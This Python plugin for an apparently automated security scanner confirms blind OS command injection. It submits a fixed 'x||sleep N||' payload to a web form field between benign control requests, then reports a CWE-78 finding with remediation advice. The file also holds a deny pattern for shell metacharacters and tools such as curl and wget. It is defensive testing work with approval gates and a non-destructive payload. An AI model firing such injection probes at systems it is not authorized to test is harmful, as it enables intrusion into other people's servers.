"""Fail-closed generic OS command-injection confirmation.

The initial mode owns one non-destructive payload and one carrier:
``form-time-delay-v1`` submits ``x||sleep N||`` to a configured form field.
Two delayed requests are bracketed by two benign controls, and every submit
uses a freshly fetched CSRF token.  Callers cannot supply commands, payloads,
headers, cookies, raw requests, callbacks, files, redirects, or alternate
origins.
"""

from __future__ import annotations

import hashlib
import json
import re
import secrets
import time
from html import unescape
from typing import Any, Dict, Iterable, Optional, Tuple
from urllib.parse import urlencode, urljoin, urlsplit

import aiohttp
from yarl import URL

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    REDACTED_RUNTIME_SECRET,
    _field_name,
    _http_target,
    _path_and_query,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"form-time-delay-v1"}
ALLOWED_PROOF_LEVELS = {"runtime-timing", "lab-state-change"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
RUNTIME_STEP_LABELS = (
    "baseline-form",
    "baseline-submit",
    "primary-form",
    "primary-delay",
    "recovery-form",
    "recovery-submit",
    "confirmation-form",
    "confirmation-delay",
)
LAB_STEP_LABELS = ("unsolved-baseline", *RUNTIME_STEP_LABELS, "solved-confirmation")
MAX_RESPONSE_BYTES = 64_000
MAX_EVIDENCE_CHARS = 65_000
MAX_PATH_CHARS = 2_048
MAX_BASE_FIELDS = 12
MAX_FIELD_VALUE_CHARS = 256
BASELINE_VALUE = "xasm-safe@example.invalid"
_SENSITIVE_FIELD = re.compile(
    r"(?:auth|csrf|token|session|cookie|pass(?:word|wd)?|secret|api[_-]?key)",
    re.I,
)
_UNSAFE_INERT_VALUE = re.compile(r"[;&|`$()<>\\\r\n\0]")
_NONCE = re.compile(r"^[0-9a-f]{32}$")
_ALLOWED_PARAMETERS = {
    "target",
    "url",
    "mode",
    "proofLevel",
    "formPath",
    "submitPath",
    "injectionParameter",
    "csrfField",
    "baseFields",
    "expectedFormStatus",
    "expectedSubmitStatus",
    "delaySeconds",
    "maxControlSeconds",
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "expectedStatusStatus",
    "engagement",
    "allowUnsafeMethods",
    "commandExecutionApproved",
    "timeoutSeconds",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}
_LAB_ONLY_PARAMETERS = {
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "expectedStatusStatus",
}


def _sha256(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _canonical_json(value: Any) -> str:
    return json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False)


def _safe_error_text(exc: Exception) -> str:
    try:
        text = str(exc)
    except Exception:
        text = exc.__class__.__name__
    return (text or exc.__class__.__name__)[:500]


def _safe_relative_path(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    raw = value.strip()
    if (
        not raw
        or raw != value
        or len(raw) > MAX_PATH_CHARS
        or not raw.startswith("/")
        or raw.startswith("//")
        or "//" in raw
        or any(ch in raw for ch in "\r\n\0\\%?#")
    ):
        return None
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.scheme or parsed.netloc or parsed.query or parsed.fragment:
        return None
    if any(segment in {".", ".."} for segment in raw.split("/")):
        return None
    return raw


def _bounded_marker(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    if (
        value != value.strip()
        or len(value) < 3
        or len(value) > 512
        or any(ch in value for ch in "\r\n\0")
    ):
        return None
    return value


def _bounded_status(parameters: Dict[str, Any], key: str) -> Optional[int]:
    try:
        value = int(parameters[key])
    except (KeyError, TypeError, ValueError):
        return None
    return value if 200 <= value <= 599 else None


def _validated_base_fields(
    value: Any,
    injection_parameter: str,
    csrf_field: str,
) -> Tuple[Optional[Dict[str, str]], str]:
    if not isinstance(value, dict) or not value or len(value) > MAX_BASE_FIELDS:
        return None, f"baseFields must contain 1 to {MAX_BASE_FIELDS} inert form fields"
    output: Dict[str, str] = {}
    for raw_name, raw_value in value.items():
        name = _field_name(raw_name)
        if (
            not name
            or _SENSITIVE_FIELD.search(name)
            or name in {injection_parameter, csrf_field}
        ):
            return None, "baseFields contains an invalid, sensitive, or reserved field name"
        if not isinstance(raw_value, (str, int, float, bool)):
            return None, f"baseFields.{name} must be a scalar value"
        text = str(raw_value)
        if (
            not text
            or len(text) > MAX_FIELD_VALUE_CHARS
            or _UNSAFE_INERT_VALUE.search(text)
            or re.search(r"\b(?:sleep|ping|nslookup|curl|wget|whoami|id)\b", text, re.I)
        ):
            return None, f"baseFields.{name} must be a bounded inert value"
        output[name] = text
    return output, ""


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    unknown = sorted(str(key) for key in parameters if key not in _ALLOWED_PARAMETERS)
    if unknown:
        return False, f"unsupported parameter: {unknown[0]}"

    has_target = isinstance(parameters.get("target"), str) and bool(parameters["target"])
    has_url = isinstance(parameters.get("url"), str) and bool(parameters["url"])
    if has_target == has_url:
        return False, "exactly one of target or url is required"
    if not _http_target(parameters.get("target") or parameters.get("url")):
        return False, (
            "target must be a credential-free HTTP(S) base URL without query or fragment"
        )
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be form-time-delay-v1"

    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-timing or lab-state-change"
    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"
    if parameters.get("commandExecutionApproved") is not True:
        return False, "commandExecutionApproved=true is required"

    for key in ("formPath", "submitPath"):
        if not _safe_relative_path(parameters.get(key)):
            return False, f"{key} must be a bounded same-origin path without query or fragment"
    injection_parameter = _field_name(parameters.get("injectionParameter"))
    csrf_field = _field_name(parameters.get("csrfField"))
    if not injection_parameter or _SENSITIVE_FIELD.search(injection_parameter):
        return False, "injectionParameter must be a valid non-sensitive form field"
    if not csrf_field or not _SENSITIVE_FIELD.search(csrf_field):
        return False, "csrfField must be a valid CSRF/token field name"
    if injection_parameter == csrf_field:
        return False, "injectionParameter and csrfField must be distinct"
    _, fields_error = _validated_base_fields(
        parameters.get("baseFields"),
        injection_parameter,
        csrf_field,
    )
    if fields_error:
        return False, fields_error

    for key in ("expectedFormStatus", "expectedSubmitStatus"):
        if _bounded_status(parameters, key) is None:
            return False, f"{key} must be between 200 and 599"
    try:
        delay_seconds = int(parameters.get("delaySeconds"))
    except (TypeError, ValueError):
        return False, "delaySeconds must be an integer"
    if delay_seconds < 2 or delay_seconds > 10:
        return False, "delaySeconds must be between 2 and 10"
    try:
        max_control_seconds = float(parameters.get("maxControlSeconds"))
    except (TypeError, ValueError):
        return False, "maxControlSeconds must be numeric"
    if max_control_seconds < 0.2 or max_control_seconds > 5.0:
        return False, "maxControlSeconds must be between 0.2 and 5.0"
    try:
        timeout_seconds = int(parameters.get("timeoutSeconds"))
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout_seconds < delay_seconds + 3 or timeout_seconds > 30:
        return False, "timeoutSeconds must be at least delaySeconds+3 and at most 30"

    if proof_level == "runtime-timing":
        unexpected = sorted(_LAB_ONLY_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for lab-state-change"
        return True, ""

    if engagement not in {"lab", "ctf"}:
        return False, "lab-state-change requires engagement lab or ctf"
    if not _safe_relative_path(parameters.get("statusPath")):
        return False, "statusPath must be a bounded same-origin path"
    if not _bounded_marker(parameters.get("unsolvedMarker")):
        return False, "unsolvedMarker must contain 3 to 512 safe characters"
    if not _bounded_marker(parameters.get("solvedMarker")):
        return False, "solvedMarker must contain 3 to 512 safe characters"
    if parameters.get("unsolvedMarker") == parameters.get("solvedMarker"):
        return False, "unsolvedMarker and solvedMarker must be distinct"
    if _bounded_status(parameters, "expectedStatusStatus") is None:
        return False, "expectedStatusStatus must be between 200 and 599"
    return True, ""


def extract_form_token(text: str, field_name: str) -> Optional[str]:
    for tag in re.findall(r"<input\b[^>]*>", text or "", re.I | re.S):
        name_match = re.search(r"\bname\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if not name_match or unescape(name_match.group(2)) != field_name:
            continue
        value_match = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
        if value_match:
            token = unescape(value_match.group(2))
            return token if 3 <= len(token) <= 2_048 else None
    return None


def _cookie_header(session: aiohttp.ClientSession, url: str) -> str:
    filtered = session.cookie_jar.filter_cookies(URL(url))
    return "; ".join(f"{key}={morsel.value}" for key, morsel in filtered.items())


def _request_transcript(
    method: str,
    url: str,
    body: str,
    cookie: str,
    secret_values: Iterable[Any],
) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-OS-Command-Injection-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,application/json",
    ]
    if body:
        lines.extend(
            [
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body.encode('utf-8'))}",
            ]
        )
    if cookie:
        lines.append(f"Cookie: {cookie}")
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body,
        secret_values,
        MAX_EVIDENCE_CHARS,
    )


def _response_transcript(
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> str:
    lines = [f"HTTP/1.1 {response['status']} {response['reason']}"]
    for name in (
        "Content-Type",
        "Content-Length",
        "Location",
        "Set-Cookie",
        "Cache-Control",
    ):
        for value in response["headers"].getall(name, []):
            lines.append(f"{name}: {value}")
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    return sanitize_evidence_text(raw, secret_values, MAX_EVIDENCE_CHARS)


def build_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    cookie: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any],
) -> Dict[str, Any]:
    request = _request_transcript(method, url, body, cookie, secret_values)
    response_text = _response_transcript(response, secret_values)
    return {
        "label": label,
        "request": request,
        "requestSha256": _sha256(request),
        "response": response_text,
        "responseSha256": _sha256(response_text),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(str(response.get("body") or "").encode("utf-8")),
        "responseExcerptTruncated": bool(response.get("truncated")),
        "durationMs": int(response.get("durationMs") or 0),
    }


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "template-id": "xasm-os-command-injection-form-timing-verified",
        "matcher-name": "two-delay-two-control-command-execution",
        "type": "http",
        "host": target,
        "matched-at": urljoin(target, str(verification.get("submitPath") or "/")),
        "info": {
            "name": "Verified Blind OS Command Injection via Time Delay",
            "severity": "critical",
            "description": (
                "A form parameter caused two independent, controlled server-side delays "
                "while matched benign submissions remained fast and recovered between "
                "probes, confirming execution in an operating-system command context."
            ),
            "remediation": (
                "Do not construct shell command strings from request data. Use a safe "
                "parameterized API or direct argument vector, enforce strict allowlists, "
                "run with least privilege, and add execution/egress monitoring."
            ),
            "classification": {"cwe-id": ["CWE-78"]},
        },
        "evidence": verification,
    }


class OsCommandInjectionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:os_command_injection_probe"

    @property
    def description(self) -> str:
        return (
            "Fail-closed generic blind OS command-injection confirmation. The initial "
            "form-time-delay-v1 mode owns a non-destructive sleep payload, refreshes "
            "CSRF for every submit, and requires two delays bracketed by two fast controls."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Authorized application base URL"},
                "url": {"type": "string", "description": "Alias for target"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                "formPath": {"type": "string"},
                "submitPath": {"type": "string"},
                "injectionParameter": {"type": "string"},
                "csrfField": {"type": "string"},
                "baseFields": {
                    "type": "object",
                    "additionalProperties": {
                        "type": ["string", "number", "integer", "boolean"],
                    },
                    "maxProperties": MAX_BASE_FIELDS,
                },
                "expectedFormStatus": {"type": "integer", "minimum": 200, "maximum": 599},
                "expectedSubmitStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 599,
                },
                "delaySeconds": {"type": "integer", "minimum": 2, "maximum": 10},
                "maxControlSeconds": {
                    "type": ["number", "integer"],
                    "minimum": 0.2,
                    "maximum": 5.0,
                },
                "statusPath": {"type": "string"},
                "unsolvedMarker": {"type": "string"},
                "solvedMarker": {"type": "string"},
                "expectedStatusStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 599,
                },
                "engagement": {
                    "type": "string",
                    "enum": ["standard", *sorted(ALLOWED_ENGAGEMENTS)],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "commandExecutionApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 5, "maximum": 30},
            },
            "required": [
                "mode",
                "proofLevel",
                "formPath",
                "submitPath",
                "injectionParameter",
                "csrfField",
                "baseFields",
                "expectedFormStatus",
                "expectedSubmitStatus",
                "delaySeconds",
                "maxControlSeconds",
                "engagement",
                "allowUnsafeMethods",
                "commandExecutionApproved",
                "timeoutSeconds",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "additionalProperties": False,
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "form"],
            "output_type": ["findings", "command_injection_proof", "evidence"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm blind OS command injection with a bounded timing oracle",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        timeout_seconds: int,
        body: Optional[str] = None,
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-OS-Command-Injection-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,application/json",
        }
        if body is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        started = time.monotonic()
        async with session.request(
            method,
            url,
            data=body,
            headers=headers,
            allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=timeout_seconds),
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            duration_ms = max(1, int(round((time.monotonic() - started) * 1_000)))
            return {
                "status": response.status,
                "reason": response.reason or "",
                "headers": response.headers,
                "body": raw[:MAX_RESPONSE_BYTES].decode("utf-8", errors="replace"),
                "truncated": len(raw) > MAX_RESPONSE_BYTES,
                "durationMs": duration_ms,
            }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "error": reason, "fallback": False, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        proof_level = str(parameters["proofLevel"]).lower()
        form_path = str(parameters["formPath"])
        submit_path = str(parameters["submitPath"])
        form_url = urljoin(target, form_path)
        submit_url = urljoin(target, submit_path)
        status_url = (
            urljoin(target, str(parameters["statusPath"]))
            if proof_level == "lab-state-change"
            else None
        )
        injection_parameter = str(parameters["injectionParameter"])
        csrf_field = str(parameters["csrfField"])
        base_fields, fields_error = _validated_base_fields(
            parameters["baseFields"],
            injection_parameter,
            csrf_field,
        )
        if fields_error or base_fields is None:
            return {
                "success": False,
                "error": fields_error,
                "fallback": False,
                "findings": [],
            }
        expected_form_status = int(parameters["expectedFormStatus"])
        expected_submit_status = int(parameters["expectedSubmitStatus"])
        delay_seconds = int(parameters["delaySeconds"])
        max_control_ms = int(round(float(parameters["maxControlSeconds"]) * 1_000))
        timeout_seconds = int(parameters["timeoutSeconds"])
        expected_status_status = (
            int(parameters["expectedStatusStatus"])
            if proof_level == "lab-state-change"
            else None
        )
        delay_payload = f"x||sleep {delay_seconds}||"
        nonce = secrets.token_hex(16)
        evidence = []
        csrf_values = []

        def result_without_finding(failure_reason: str) -> Dict[str, Any]:
            return {
                "success": True,
                "tool": self.name,
                "toolName": self.name,
                "target": target,
                "mode": "form-time-delay-v1",
                "proofLevel": proof_level,
                "fallback": False,
                "verification": {
                    "verified": False,
                    "reason": failure_reason,
                    "mode": "form-time-delay-v1",
                    "proofLevel": proof_level,
                    "nonce": nonce,
                    "requestCount": len(evidence),
                    "evidence": evidence,
                },
                "findings": [],
                "total_findings": 0,
            }

        try:
            connector = aiohttp.TCPConnector(ssl=True)
            async with aiohttp.ClientSession(
                connector=connector,
                cookie_jar=aiohttp.CookieJar(unsafe=True),
            ) as session:
                solved_before: Optional[bool] = None
                solved_after: Optional[bool] = None
                if status_url:
                    cookie = _cookie_header(session, status_url)
                    response = await self._request(
                        session,
                        "GET",
                        status_url,
                        timeout_seconds,
                    )
                    evidence.append(
                        build_evidence_step(
                            LAB_STEP_LABELS[0],
                            "GET",
                            status_url,
                            "",
                            cookie,
                            response,
                            csrf_values,
                        )
                    )
                    body = str(response.get("body") or "")
                    solved_before = str(parameters["solvedMarker"]) in body
                    if (
                        response["status"] != expected_status_status
                        or response["truncated"]
                        or str(parameters["unsolvedMarker"]) not in body
                        or solved_before
                        or response["headers"].get("Location")
                    ):
                        return result_without_finding("fresh unsolved baseline was not confirmed")

                timings: Dict[str, int] = {}
                submit_values = (
                    ("baseline", BASELINE_VALUE),
                    ("primary", delay_payload),
                    ("recovery", BASELINE_VALUE),
                    ("confirmation", delay_payload),
                )
                for index, (role, injected_value) in enumerate(submit_values):
                    form_label = RUNTIME_STEP_LABELS[index * 2]
                    submit_label = RUNTIME_STEP_LABELS[index * 2 + 1]

                    form_cookie = _cookie_header(session, form_url)
                    form_response = await self._request(
                        session,
                        "GET",
                        form_url,
                        timeout_seconds,
                    )
                    token = extract_form_token(str(form_response.get("body") or ""), csrf_field)
                    secrets_for_form = [*csrf_values, token]
                    evidence.append(
                        build_evidence_step(
                            form_label,
                            "GET",
                            form_url,
                            "",
                            form_cookie,
                            form_response,
                            secrets_for_form,
                        )
                    )
                    if (
                        form_response["status"] != expected_form_status
                        or form_response["truncated"]
                        or form_response["headers"].get("Location")
                        or not token
                    ):
                        return result_without_finding(
                            f"{form_label} did not return a fresh bounded CSRF form"
                        )
                    csrf_values.append(token)

                    fields = dict(base_fields)
                    fields[injection_parameter] = injected_value
                    fields[csrf_field] = token
                    submit_body = urlencode(fields)
                    submit_cookie = _cookie_header(session, submit_url)
                    submit_response = await self._request(
                        session,
                        "POST",
                        submit_url,
                        timeout_seconds,
                        submit_body,
                    )
                    secrets_for_submit = [
                        *csrf_values,
                        urlencode({csrf_field: token}).split("=", 1)[1],
                    ]
                    evidence.append(
                        build_evidence_step(
                            submit_label,
                            "POST",
                            submit_url,
                            submit_body,
                            submit_cookie,
                            submit_response,
                            secrets_for_submit,
                        )
                    )
                    if (
                        submit_response["status"] != expected_submit_status
                        or submit_response["truncated"]
                        or submit_response["headers"].get("Location")
                    ):
                        return result_without_finding(
                            f"{submit_label} returned an unexpected or unsafe response"
                        )
                    timings[role] = int(submit_response["durationMs"])

                if status_url:
                    cookie = _cookie_header(session, status_url)
                    response = await self._request(
                        session,
                        "GET",
                        status_url,
                        timeout_seconds,
                    )
                    evidence.append(
                        build_evidence_step(
                            LAB_STEP_LABELS[-1],
                            "GET",
                            status_url,
                            "",
                            cookie,
                            response,
                            csrf_values,
                        )
                    )
                    body = str(response.get("body") or "")
                    solved_after = str(parameters["solvedMarker"]) in body
                    if (
                        response["status"] != expected_status_status
                        or response["truncated"]
                        or response["headers"].get("Location")
                        or not solved_after
                    ):
                        return result_without_finding("solved confirmation was not observed")

        except Exception as exc:
            return {
                "success": False,
                "error": _safe_error_text(exc),
                "fallback": False,
                "findings": [],
            }

        baseline_ms = timings["baseline"]
        primary_ms = timings["primary"]
        recovery_ms = timings["recovery"]
        confirmation_ms = timings["confirmation"]
        slower_control_ms = max(baseline_ms, recovery_ms)
        primary_delta_ms = primary_ms - slower_control_ms
        confirmation_delta_ms = confirmation_ms - slower_control_ms
        minimum_delta_ms = max(int(delay_seconds * 700), delay_seconds * 1_000 - 1_500)
        controls_fast = baseline_ms <= max_control_ms and recovery_ms <= max_control_ms
        primary_delayed = primary_delta_ms >= minimum_delta_ms
        confirmation_delayed = confirmation_delta_ms >= minimum_delta_ms
        expected_labels = LAB_STEP_LABELS if proof_level == "lab-state-change" else RUNTIME_STEP_LABELS
        exact_evidence = tuple(step.get("label") for step in evidence) == expected_labels
        verified = bool(
            controls_fast
            and primary_delayed
            and confirmation_delayed
            and exact_evidence
            and (
                proof_level == "runtime-timing"
                or (solved_before is False and solved_after is True)
            )
        )

        verification: Dict[str, Any] = {
            "verified": verified,
            "mode": "form-time-delay-v1",
            "proofLevel": proof_level,
            "nonce": nonce,
            "target": target,
            "formPath": form_path,
            "submitPath": submit_path,
            "injectionParameter": injection_parameter,
            "csrfField": csrf_field,
            "baseFieldsSha256": _sha256(_canonical_json(base_fields)),
            "expectedFormStatus": expected_form_status,
            "expectedSubmitStatus": expected_submit_status,
            "delaySeconds": delay_seconds,
            "maxControlSeconds": float(parameters["maxControlSeconds"]),
            "timeoutSeconds": timeout_seconds,
            "baselineMs": baseline_ms,
            "primaryDelayMs": primary_ms,
            "recoveryMs": recovery_ms,
            "confirmationDelayMs": confirmation_ms,
            "primaryDeltaMs": primary_delta_ms,
            "confirmationDeltaMs": confirmation_delta_ms,
            "minimumDeltaMs": minimum_delta_ms,
            "controlsFast": controls_fast,
            "primaryDelayed": primary_delayed,
            "confirmationDelayed": confirmation_delayed,
            "fixedPayloadSha256": _sha256(delay_payload),
            "requestCount": len(evidence),
            "fallback": False,
            "evidence": evidence,
        }
        if proof_level == "lab-state-change":
            verification.update(
                {
                    "statusPath": str(parameters["statusPath"]),
                    "unsolvedMarker": str(parameters["unsolvedMarker"]),
                    "solvedMarker": str(parameters["solvedMarker"]),
                    "expectedStatusStatus": expected_status_status,
                    "solvedBefore": solved_before,
                    "solvedAfter": solved_after,
                }
            )

        finding = build_nuclei_finding(target, verification) if verified else None
        findings = [finding] if finding else []
        return {
            "success": True,
            "tool": self.name,
            "toolName": self.name,
            "target": target,
            "mode": "form-time-delay-v1",
            "proofLevel": proof_level,
            "fallback": False,
            "verification": verification,
            "findings": findings,
            "total_findings": len(findings),
            "summary": {
                "verified": verified,
                "proofLevel": proof_level,
                "controlsFast": controls_fast,
                "primaryDelayed": primary_delayed,
                "confirmationDelayed": confirmation_delayed,
                "solvedTransition": solved_before is False and solved_after is True,
                "requestCount": len(evidence),
            },
        }


def get_tool():
    return OsCommandInjectionProbeTool()
